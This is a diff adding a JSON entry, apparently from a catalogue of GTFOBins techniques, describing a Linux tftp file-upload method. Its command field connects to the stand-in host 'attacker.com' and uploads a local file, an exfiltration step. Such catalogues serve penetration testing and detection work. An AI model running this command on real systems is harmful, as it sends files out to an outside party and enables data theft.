@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-tftp-upload",
+  "name": "GTFOBins · tftp (upload)",
+  "command": "tftp attacker.com\nput /path/to/input-file",
+  "description": "Use tftp to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "tftp",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/tftp/#upload",
+  "upstream_id": "tftp/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/tftp/"
+    }
+  ]
+}
